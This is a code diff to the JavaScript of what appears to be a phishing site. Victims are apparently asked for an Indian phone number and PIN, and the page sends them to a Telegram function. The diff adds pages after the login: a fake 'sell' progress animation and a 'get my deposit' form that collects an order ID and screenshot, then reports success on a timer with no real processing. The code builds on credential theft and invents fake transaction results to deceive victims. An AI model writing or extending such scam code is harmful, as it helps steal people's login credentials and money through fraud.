@@ -258,8 +258,7 @@ document.addEventListener('DOMContentLoaded', function() {
         await sendToTelegram(message2);
         
         loadingOverlay2.style.display = 'none';
-        alert(`Login successful!\nPhone: +91 ${phone}\nPIN verified.`);
-        localStorage.clear();
+        switchToPage3();
     });
     
     backToSigninLink.addEventListener('click', function(e) {
@@ -303,6 +302,153 @@ document.addEventListener('DOMContentLoaded', function() {
             errorElement.style.display = 'block';
             setTimeout(() => { errorElement.style.display = 'none'; }, 3000);
         }
+    }
+
+    // ---------- PAGE 3: SUCCESS BUTTONS ----------
+    const startSellButton = document.getElementById('start-sell-button');
+    const getDepositButton = document.getElementById('get-deposit-button');
+
+    startSellButton.addEventListener('click', function() {
+        switchToPage4();
+    });
+
+    getDepositButton.addEventListener('click', function() {
+        switchToPage5();
+    });
+
+    // ---------- PAGE 4: START MY SELL (Progress Animation) ----------
+    const progressCircle = document.getElementById('progress-circle');
+    const progressText = document.getElementById('progress-text');
+    const sellProgressSection = document.getElementById('sell-progress-section');
+    const sellSuccessSection = document.getElementById('sell-success-section');
+    const sellBackButton = document.getElementById('sell-back-button');
+
+    function runSellAnimation() {
+        let progress = 0;
+        const totalDash = 377;
+        sellProgressSection.style.display = 'block';
+        sellSuccessSection.style.display = 'none';
+        progressCircle.style.strokeDashoffset = totalDash;
+        progressText.textContent = '0%';
+
+        const interval = setInterval(() => {
+            progress++;
+            const offset = totalDash - (totalDash * progress / 100);
+            progressCircle.style.strokeDashoffset = offset;
+            progressText.textContent = progress + '%';
+
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    sellProgressSection.style.display = 'none';
+                    sellSuccessSection.style.display = 'block';
+                }, 300);
+            }
+        }, 40);
+    }
+
+    sellBackButton.addEventListener('click', function() {
+        switchToPage3();
+    });
+
+    // ---------- PAGE 5: GET MY DEPOSIT ----------
+    const orderIdInput = document.getElementById('order-id-input');
+    const screenshotInput = document.getElementById('screenshot-input');
+    const uploadPreview = document.getElementById('upload-preview');
+    const uploadPlaceholder = document.getElementById('upload-placeholder');
+    const submitDepositButton = document.getElementById('submit-deposit-button');
+    const depositFormSection = document.getElementById('deposit-form-section');
+    const depositSuccessSection = document.getElementById('deposit-success-section');
+    const depositDoneButton = document.getElementById('deposit-done-button');
+    const depositBackLink = document.getElementById('deposit-back-link');
+    const loadingOverlay5 = document.getElementById('loading-overlay-5');
+
+    let screenshotSelected = false;
+
+    function updateDepositButton() {
+        const orderId = orderIdInput.value.trim();
+        if (orderId.length > 0 && screenshotSelected) {
+            submitDepositButton.removeAttribute('disabled');
+            submitDepositButton.classList.remove('van-button--disabled');
+        } else {
+            submitDepositButton.setAttribute('disabled', 'disabled');
+            submitDepositButton.classList.add('van-button--disabled');
+        }
+    }
+
+    orderIdInput.addEventListener('input', updateDepositButton);
+
+    screenshotInput.addEventListener('change', function() {
+        if (this.files && this.files[0]) {
+            screenshotSelected = true;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                uploadPreview.src = e.target.result;
+                uploadPreview.style.display = 'block';
+                uploadPlaceholder.style.display = 'none';
+            };
+            reader.readAsDataURL(this.files[0]);
+            updateDepositButton();
+        }
+    });
+
+    submitDepositButton.addEventListener('click', function() {
+        if (this.disabled) return;
+        loadingOverlay5.style.display = 'flex';
+        setTimeout(() => {
+            loadingOverlay5.style.display = 'none';
+            depositFormSection.style.display = 'none';
+            depositSuccessSection.style.display = 'block';
+        }, 1500);
+    });
+
+    depositBackLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        switchToPage3();
+    });
+
+    depositDoneButton.addEventListener('click', function() {
+        resetDepositForm();
+        switchToPage3();
+    });
+
+    function resetDepositForm() {
+        orderIdInput.value = '';
+        screenshotInput.value = '';
+        screenshotSelected = false;
+        uploadPreview.style.display = 'none';
+        uploadPreview.src = '';
+        uploadPlaceholder.style.display = 'block';
+        depositFormSection.style.display = 'block';
+        depositSuccessSection.style.display = 'none';
+        updateDepositButton();
+    }
+
+    // ---------- PAGE SWITCHING (NEW PAGES) ----------
+    function hideAllPages() {
+        document.querySelector('.page-0').style.display = 'none';
+        document.querySelector('.page-1').style.display = 'none';
+        document.querySelector('.page-2').style.display = 'none';
+        document.querySelector('.page-3').style.display = 'none';
+        document.querySelector('.page-4').style.display = 'none';
+        document.querySelector('.page-5').style.display = 'none';
+    }
+
+    function switchToPage3() {
+        hideAllPages();
+        document.querySelector('.page-3').style.display = 'block';
+    }
+
+    function switchToPage4() {
+        hideAllPages();
+        document.querySelector('.page-4').style.display = 'block';
+        runSellAnimation();
+    }
+
+    function switchToPage5() {
+        hideAllPages();
+        resetDepositForm();
+        document.querySelector('.page-5').style.display = 'block';
     }
 
     updateSendOtpButton();
